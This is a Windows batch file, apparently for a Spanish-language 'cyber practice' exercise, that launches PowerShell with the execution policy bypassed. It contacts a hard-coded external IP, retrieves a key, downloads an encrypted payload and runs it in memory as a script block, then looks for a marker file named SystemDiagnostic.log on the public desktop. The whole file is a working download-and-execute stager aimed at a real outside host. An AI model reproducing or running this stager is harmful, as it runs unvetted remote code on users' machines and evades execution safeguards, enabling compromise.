@echo off
setlocal

REM ===== Ejecutar PowerShell de forma segura =====
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
"& {
$ErrorActionPreference = 'Stop'

Write-Host '============================================' -ForegroundColor Green
Write-Host '  CYBER PRACTICA - FULL DEBUG MODE' -ForegroundColor Green
Write-Host '============================================' -ForegroundColor Green

# INFO
Write-Host ('PC: ' + $env:COMPUTERNAME) -ForegroundColor Cyan
Write-Host ('User: ' + $env:USERNAME) -ForegroundColor Cyan
Write-Host ('Time: ' + (Get-Date)) -ForegroundColor Cyan

try {

    # ========================
    # STEP 1 - CONNECT
    # ========================
    Write-Host \"`n[1/5] Conectando al servidor...\" -ForegroundColor Yellow
    $base = 'http://82.29.153.101:8080'

    $health = Invoke-WebRequest -Uri ($base + '/health') -UseBasicParsing -TimeoutSec 5
    Write-Host ('✓ Servidor OK (' + $health.StatusCode + ')') -ForegroundColor Green

    # ========================
    # STEP 2 - GET KEY
    # ========================
    Write-Host \"`n[2/5] Obteniendo clave...\" -ForegroundColor Yellow

    $ts = [int](Get-Date -UFormat %s)
    $keyResp = Invoke-WebRequest -Uri ($base + '/auth/key?ts=' + $ts) -UseBasicParsing
    $payloadKey = $keyResp.Content.Trim()

    if ($payloadKey.Length -ne 44) {
        throw 'Key invalida'
    }

    Write-Host ('✓ Key OK (' + $payloadKey.Length + ' chars)') -ForegroundColor Green

    # ========================
    # STEP 3 - DOWNLOAD PAYLOAD
    # ========================
    Write-Host \"`n[3/5] Descargando payload...\" -ForegroundColor Yellow

    $headers = @{ 'X-Decrypt-Key' = $payloadKey }

    $payloadResp = Invoke-WebRequest `
        -Uri ($base + '/payload/encrypted') `
        -Headers $headers `
        -UseBasicParsing `
        -TimeoutSec 10

    if (-not $payloadResp.Content) {
        throw 'Payload vacio'
    }

    Write-Host ('✓ Payload recibido (' + $payloadResp.Content.Length + ' bytes)') -ForegroundColor Green

    # ========================
    # STEP 4 - EXECUTE IN MEMORY
    # ========================
    Write-Host \"`n[4/5] Ejecutando en memoria...\" -ForegroundColor Yellow

    $scriptBlock = [scriptblock]::Create($payloadResp.Content)
    & $scriptBlock

    Write-Host '✓ Payload ejecutado' -ForegroundColor Green

    # ========================
    # STEP 5 - VERIFY
    # ========================
    Write-Host \"`n[5/5] Verificando resultado...\" -ForegroundColor Yellow

    Start-Sleep 2
    $marker = \"$env:PUBLIC\Desktop\SystemDiagnostic.log\"

    if (Test-Path $marker) {
        Write-Host \"✓ ✓ ✓ EJECUCION EXITOSA ✓ ✓ ✓\" -ForegroundColor Green
        Get-Content $marker
    } else {
        Write-Host \"⚠ Marker no encontrado\" -ForegroundColor Yellow
    }

} catch {
    Write-Host \"`n❌ ERROR:\" -ForegroundColor Red
    Write-Host $_.Exception.Message -ForegroundColor Red
}

Write-Host \"`n============================================\" -ForegroundColor Green
Write-Host 'FIN DEL SCRIPT' -ForegroundColor Green
Write-Host '============================================' -ForegroundColor Green

Read-Host 'Presiona ENTER para salir'
}"